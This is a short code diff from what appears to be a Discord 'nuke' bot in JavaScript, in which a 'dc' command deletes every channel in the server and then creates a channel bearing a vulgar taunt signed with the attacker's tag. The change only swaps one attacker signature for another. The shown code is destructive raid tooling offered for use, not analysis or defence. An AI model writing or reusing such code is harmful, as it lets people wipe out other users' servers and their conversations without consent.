@@ -639,7 +639,7 @@ bot.on("message", message => {
     if (message.content === prefix + 'dc') {
         message.delete();
         message.guild.channels.forEach((d) => d.delete());
-        message.guild.createChannel('fucked by 𝒌𝒔𝑿', 'text')
+        message.guild.createChannel('fucked by EZSELF', 'text')
     }
 });
 bot.on("message", message => {
